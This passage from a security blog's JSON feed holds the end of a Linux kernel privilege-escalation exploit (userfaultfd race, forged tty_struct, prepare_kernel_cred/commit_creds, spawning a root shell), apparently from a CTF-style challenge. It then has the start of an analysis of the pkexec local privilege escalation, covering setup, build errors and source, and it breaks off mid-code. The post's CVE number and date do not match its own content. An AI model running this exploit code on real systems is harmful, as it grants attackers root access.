class=\"number\">1</span> ,<span class=\"number\">0x400</span> ,zero);</span><br><span class=\"line\"></span><br><span class=\"line\">\tgift(ntbk);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[PREPARE_KERNEL_CRED];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">6</span>] = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tfake_tty_ops[<span class=\"number\">12</span>] = work_for_cpu_fn;</span><br><span class=\"line\"></span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">1</span>, fake_tty_ops);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;prepare kernel cred...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">111</span>, <span class=\"number\">111</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;prepare&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;work_for_cpu_fn return 0x%lx&quot;</span>, fake_tty_struct[<span class=\"number\">6</span>]);</span><br><span class=\"line\">\tread_from_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">3</span>] = ntbk[<span class=\"number\">1</span>].buf;<span class=\"comment\">// ops&#x27;s addr</span></span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">4</span>] = a[COMMIT_CREDS];</span><br><span class=\"line\">\tfake_tty_struct[<span class=\"number\">5</span>] = fake_tty_struct[<span class=\"number\">6</span>];</span><br><span class=\"line\">\twrite_to_kernel(<span class=\"number\">0</span>, fake_tty_struct);</span><br><span class=\"line\"></span><br><span class=\"line\">\tInfo(<span class=\"string\">&quot;commit creds...&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">for</span>(<span class=\"type\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">0x30</span>; i++)</span><br><span class=\"line\">\t\tioctl(ptmx_fds[i], <span class=\"number\">233</span>, <span class=\"number\">233</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;commit&quot;</span>);</span><br><span class=\"line\">\t</span><br><span class=\"line\">\tgetshell();</span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">uffd_register</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_api</span> <span class=\"title\">ua</span>;</span><span class=\"comment\">// io operation api</span></span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_register</span> <span class=\"title\">ur</span>;</span><span class=\"comment\">// io register</span></span><br><span class=\"line\">    <span class=\"comment\">// find /usr/include -name unistd_64.h 2&gt;/dev/null</span></span><br><span class=\"line\">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;uffd: %d&quot;</span>, uffd);</span><br><span class=\"line\"></span><br><span class=\"line\">\tua.api = UFFD_API;</span><br><span class=\"line\">\tua.features = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_API, &amp;ua) == <span class=\"number\">-1</span>) </span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_API,ua)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tur.range.start = (<span class=\"type\">long</span> <span class=\"type\">long</span> <span class=\"type\">unsigned</span> <span class=\"type\">int</span>)fault_page;</span><br><span class=\"line\">\tur.range.len   = fault_page_len;</span><br><span class=\"line\">\tur.mode \t   = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(ioctl(uffd, UFFDIO_REGISTER, &amp;ur) == <span class=\"number\">-1</span>)</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;ioctl(uffd,UFFDIO_REGISTER,&amp;ur)&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"type\">pthread_t</span> thr;</span><br><span class=\"line\">\t<span class=\"comment\">// 注意这里没有-1 pthread create正常返回0</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span>(pthread_create(&amp;thr, <span class=\"literal\">NULL</span>, UFFD_handler ,<span class=\"literal\">NULL</span>))</span><br><span class=\"line\">\t\terrExit(<span class=\"string\">&quot;pthread_create&quot;</span>);</span><br><span class=\"line\">\tDone(<span class=\"string\">&quot;regitser&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> *<span class=\"title function_\">UFFD_handler</span><span class=\"params\">(<span class=\"type\">void</span> *nil)</span>&#123;</span><br><span class=\"line\">\tDbg(<span class=\"string\">&quot;UFFD handler start&quot;</span>);</span><br><span class=\"line\">\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffd_msg</span> <span class=\"title\">msg</span>;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (<span class=\"number\">1</span>)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">pollfd</span> <span class=\"title\">pollfd</span>;</span></span><br><span class=\"line\">\t\t<span class=\"type\">int</span> nready = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tpollfd.fd\t\t= uffd;</span><br><span class=\"line\">\t\tpollfd.events\t= POLLIN ;</span><br><span class=\"line\">\t\tnready = poll(&amp;pollfd, <span class=\"number\">1</span>, <span class=\"number\">-1</span>);<span class=\"comment\">// block here</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(nready != <span class=\"number\">1</span>)</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;poll&quot;</span>);</span><br><span class=\"line\">\t\t</span><br><span class=\"line\">\t\t&#123;<span class=\"comment\">// user code modify area</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x500</span>, zero);<span class=\"comment\">// 第一个edit free掉vuln chunk</span></span><br><span class=\"line\">\t\t\tedit(<span class=\"number\">0</span>, <span class=\"number\">0x400</span>, zero);<span class=\"comment\">// 第二个edit 确保size不变</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span>(read(uffd, &amp;msg, <span class=\"keyword\">sizeof</span>(msg)) != <span class=\"keyword\">sizeof</span>(msg))</span><br><span class=\"line\">\t\t\terrExit(<span class=\"string\">&quot;read&quot;</span>);</span><br><span class=\"line\">\t\tassert(msg.event == UFFD_EVENT_PAGEFAULT);</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">uffdio_copy</span> <span class=\"title\">uc</span>;</span></span><br><span class=\"line\">\t\tuc.src \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)zero;</span><br><span class=\"line\">\t\tuc.dst \t= (<span class=\"type\">unsigned</span> <span class=\"type\">long</span>)fault_page;</span><br><span class=\"line\">\t\tuc.len \t= fault_page_len;</span><br><span class=\"line\">\t\tuc.mode = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\tioctl(uffd, UFFDIO_COPY, &amp;uc);</span><br><span class=\"line\">\t\tDone(<span class=\"string\">&quot;ioctl done&quot;</span>);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "Linux",
                "Kernel state"
            ]
        },
        {
            "id": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "url": "https://squirre17.github.io/2021/08/11/CVE-2021-4030-polkit-pkexec-%E6%9C%AC%E5%9C%B0%E6%8F%90%E6%9D%83/",
            "title": "CVE-2021-4030 polkit-pkexec 本地提权分析",
            "date_published": "2021-08-10T16:00:00.000Z",
            "content_html": "<h2 id=\"参考\"><a class=\"markdownIt-Anchor\" href=\"#参考\">#</a> 参考</h2>\n<ul>\n<li><a href=\"https://bbs.pediy.com/thread-271423.htm\">看雪大爹</a></li>\n<li><a href=\"https://trganda.github.io/posts/iconv/\">GCONV_PATH 利用</a></li>\n<li><a href=\"https://blog.csdn.net/qq_42303523/article/details/117911859#:~:text=linux%E7%B3%BB%E7%BB%9F%E6%8F%90,%E6%89%A7%E8%A1%8C%E8%BF%87%E7%A8%8B%E4%BC%9A%E5%A6%82%E4%B8%8B%EF%BC%9A\">GCONV_PATH 利用 2</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/470224218?utm_source=qq&amp;utm_medium=social&amp;utm_oi=949109417673797632\">合天</a></li>\n<li><a href=\"https://mp.weixin.qq.com/s?__biz=Mzg2MTY0MDc1Mw==&amp;mid=2247484520&amp;idx=1&amp;sn=b9fdfa0c5cc802478a541964a0d5b2c2&amp;chksm=ce154536f962cc20db00097e2b0f4cc155aefb25e54dbc31af29733be6ecf9ba21d3fd77b908&amp;mpshare=1&amp;scene=23&amp;srcid=0301ZZXX7YvmTLBFW02HGXd5&amp;sharer_sharetime=1646130648823&amp;sharer_shareid=35c6bdd49b9ea011edbc171a217d1072#rd\">天玄实验室</a></li>\n<li><a href=\"https://www.anquanke.com/post/id/267774#h3-2\">安全客</a></li>\n<li><a href=\"https://www.wt37.cn/5949.html\">少羽</a></li>\n</ul>\n<h2 id=\"软件简介\"><a class=\"markdownIt-Anchor\" href=\"#软件简介\">#</a> 软件简介</h2>\n<p><a href=\"https://gitlab.freedesktop.org/polkit/polkit/\">https://gitlab.freedesktop.org/polkit/polkit/</a></p>\n<blockquote>\n<p>polkit is a toolkit for defining and handling authorizations. It is used for allowing unprivileged processes to speak to privileged processes.</p>\n</blockquote>\n<p>pkexec 是 polkit 是一个程序，polkit 负责不同特权级的进程间的通讯<br>\n <code>pkexec echo &quot;1&quot;</code></p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --help</span><br><span class=\"line\">pkexec --version |</span><br><span class=\"line\">       --help |</span><br><span class=\"line\">       --disable-internal-agent |</span><br><span class=\"line\">       [--user username] PROGRAM [ARGUMENTS...]</span><br><span class=\"line\"></span><br><span class=\"line\">See the pkexec manual page for more details.</span><br></pre></td></tr></table></figure>\n<h2 id=\"环境\"><a class=\"markdownIt-Anchor\" href=\"#环境\">#</a> 环境</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ pkexec --version</span><br><span class=\"line\">pkexec version 0.105</span><br><span class=\"line\">squ@squ-virtual-machine:~/tools/modules-5.0.1$ uname -a</span><br><span class=\"line\">Linux squ-virtual-machine 5.11.0-46-generic #51~20.04.1-Ubuntu SMP Fri Jan 7 06:51:40 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure>\n<p>docker：<br>\npull 个 debian 下来，然后设置共享卷</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">docker run -it --name=de -v /home/squ/docker_volumn:/home/vol debian /bin/bash</span><br></pre></td></tr></table></figure>\n<h2 id=\"下载源码\"><a class=\"markdownIt-Anchor\" href=\"#下载源码\">#</a> 下载源码</h2>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">squ@squ-virtual-machine:~/Desktop/cve/policykit-1-0.105$ dpkg -S /usr/bin/pkexec</span><br><span class=\"line\">policykit-1: /usr/bin/pkexec</span><br></pre></td></tr></table></figure>\n<p><code>dpkg</code>  查看包为 <code>policykit-1</code> <br>\n <code>sudo apt source policykit-1</code>  或者<br>\n<a href=\"https://launchpad.net/ubuntu/bionic/+package/policykit-1\"> https://launchpad.net/ubuntu/bionic/+package/policykit-1</a><br>\n 影响版本 <code>0~0.105</code></p>\n<p>下载后路径在 <code>/home/squ/Desktop/cve/policykit-1-0.105/src/programs/pkexec.c</code></p>\n<h2 id=\"环境搭建\"><a class=\"markdownIt-Anchor\" href=\"#环境搭建\">#</a> 环境搭建</h2>\n<p>源码地址<br>\n<a href=\"https://gitlab.freedesktop.org/polkit/polkit\"> https://gitlab.freedesktop.org/polkit/polkit</a><br>\n 基本找个虚拟机就能打，真是太 coooooooooooooooooooooooooooool 了<br>\n docker<br>\n 如果遇到了 <code>hash mismatch</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">E: Failed to fetch http:<span class=\"comment\">//deb.debian.org/debian/pool/main/b/binutils/binutils-common_2.35.2-2_amd64.deb  Hash Sum mismatch</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get clean  </span><br><span class=\"line\">apt-get update --fix-missing </span><br></pre></td></tr></table></figure>\n<p>如果还是不行就换源 <code>/etc/apt/sources.list</code> (debian)<br>\n 再不行就关代理吧（关了就好了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable main contrib non-free</span></span></span><br><span class=\"line\">deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\"># deb http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"><span class=\"meta\"># deb-src http:<span class=\"comment\">//mirrors.ustc.edu.cn/debian stable-proposed-updates main contrib non-free</span></span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>里面有一个 <code>INSTALL</code>  的文件</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libc6-dev</span><br><span class=\"line\">apt install gobjc++</span><br><span class=\"line\">./configure CC=c99 CFLAGS=-g LIBS=-lposix</span><br></pre></td></tr></table></figure>\n<p>遇到问题</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking whether the C compiler works... no</span><br><span class=\"line\">configure: error: in `/home/vol/policykit<span class=\"number\">-1</span><span class=\"number\">-0.105&#x27;</span>:</span><br><span class=\"line\">configure: error: C compiler cannot create executables</span><br></pre></td></tr></table></figure>\n<p>看 <code>config.log</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure:<span class=\"number\">3355</span>: $? = <span class=\"number\">1</span></span><br><span class=\"line\">configure:<span class=\"number\">3375</span>: checking whether the C compiler works</span><br><span class=\"line\">configure:<span class=\"number\">3397</span>: /usr/bin/gcc -g   conftest.c -lposix &gt;&amp;<span class=\"number\">5</span></span><br><span class=\"line\">/usr/bin/ld: cannot find -lposix</span><br><span class=\"line\">collect2: error: ld returned <span class=\"number\">1</span> <span class=\"built_in\">exit</span> status</span><br></pre></td></tr></table></figure>\n<p>安装库</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install manpages-posix-dev\t</span><br></pre></td></tr></table></figure>\n<p>也没用，索性不加 <code>posix</code>  试试看</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">./configure CC=c99 CFLAGS=-g <span class=\"comment\">//LIBS=-lposix</span></span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: The pkg-config script could not be found or is too old.  Make sure it</span><br><span class=\"line\">is in your PATH or <span class=\"built_in\">set</span> the PKG_CONFIG environment variable to the full</span><br><span class=\"line\">path to pkg-config.</span><br></pre></td></tr></table></figure>\n<p>安装</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y pkg-config</span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">configure: error: Package requirements (gio-2.0 &gt;= 2.28.0) were not met:</span><br><span class=\"line\"></span><br><span class=\"line\">No package &#x27;gio-2.0&#x27; found</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y gio-2.0</span><br></pre></td></tr></table></figure>\n<p>然后又来</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/usr/bin/ld: cannot find -lpam</span><br></pre></td></tr></table></figure>\n<p>这是因为缺少 <code>libpam.so</code>  的库，在 debian 系统上，可以这样下载  <code>lib + id-dev</code></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install -y libpam-dev</span><br></pre></td></tr></table></figure>\n<p>继续报错</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">checking <span class=\"keyword\">for</span> intltool &gt;= <span class=\"number\">0.40</span><span class=\"number\">.0</span>...  found</span><br><span class=\"line\">configure: error: Your intltool is too old.  You need intltool <span class=\"number\">0.40</span><span class=\"number\">.0</span> or later.</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install intltool</span><br></pre></td></tr></table></figure>\n<p>configure 没问题了 make 来了</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">polkitagentsession.c:<span class=\"number\">58</span>:<span class=\"number\">10</span>: fatal error: gio/gunixoutputstream.h: No such file or directory</span><br><span class=\"line\">   <span class=\"number\">58</span> | <span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;gio/gunixoutputstream.h&gt;</span></span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">apt-get install libglib2.0</span><br><span class=\"line\">apt-get install libgio2.0</span><br></pre></td></tr></table></figure>\n<p>还是没用<br>\n发现 <code>gio-unix-2.0*</code>  下面就是 <code>gio</code></p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">cp</span> -r /usr/include/gio-unix-2.0/gio/ /usr/include/</span><br></pre></td></tr></table></figure>\n<h2 id=\"原理分析\"><a class=\"markdownIt-Anchor\" href=\"#原理分析\">#</a> 原理分析</h2>\n<h3 id=\"数组越界\"><a class=\"markdownIt-Anchor\" href=\"#数组越界\">#</a> 数组越界</h3>\n<figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"type\">int</span> <span class=\"title\">main</span> <span class=\"params\">(<span class=\"type\">int</span> argc, <span class=\"type\">char</span> *argv[])</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">  ·······</span><br><span class=\"line\">  <span class=\"type\">const</span> gchar *environment_variables_to_save[] = &#123;</span><br><span class=\"line\">    <span class=\"string\">&quot;SHELL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANG&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LINGUAS&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LANGUAGE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_COLLATE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_CTYPE&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MESSAGES&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_MONETARY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_NUMERIC&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_TIME&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;LC_ALL&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;TERM&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;COLORTERM&quot;</span>,</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/* By default we don&#x27;t allow running X11 apps, as it does not work in the</span></span><br><span class=\"line\"><span class=\"comment\">     * general case. See</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     *  https://bugs.freedesktop.org/show_bug.cgi?id=17970#c26</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * and surrounding comments for a lot of discussion about this.</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * However, it can be enabled for some selected and tested legacy programs</span></span><br><span class=\"line\"><span class=\"comment\">     * which previously used e. g. gksu, by setting the</span></span><br><span class=\"line\"><span class=\"comment\">     * org.freedesktop.policykit.exec.allow_gui annotation to a nonempty value.</span></span><br><span class=\"line\"><span class=\"comment\">     * See https://bugs.freedesktop.org/show_bug.cgi?id=38769 for details.</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"string\">&quot;DISPLAY&quot;</span>,</span><br><span class=\"line\">    <span class=\"string\">&quot;XAUTHORITY&quot;</span>,</span><br><span class=\"line\">    <span class=\"literal\">NULL</span></span><br><span class=\"line\">  &#125;;</span><br><span class=\"line\">  GPtrArray *saved_env;</span><br><span class=\"line\">  gchar *opt_user;</span><br><span class=\"line\">  <span class=\"type\">pid_t</span> pid_of_caller;</span><br><span class=\"line\">  gpointer local_agent_handle;</span><br><span class=\"line\"></span><br><span class=\"line\">  ret = <span class=\"number\">127</span>;</span><br><span class=\"line\">  authority = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  subject = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  details = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  result = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  action_id = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  saved_env = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  path = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  command_line = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  opt_user = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">  local_agent_handle = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">  <span class=\"comment\">/* check for correct invocation */</span></span><br><span class=\"line\">  <span class=\"keyword\">if</span> (<span class=\"built_in\">geteuid</span> () != <span class=\"number\">0</span>)</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">      <span class=\"built_in\">g_printerr</span> (<span class=\"string\">&quot;pkexec must be setuid root\\n&quot;</span>);</span><br><span class=\"line\">      <span class=\"keyword\">goto</span> out;</span><br><span class=\"line\">    &#125;</span><br><span 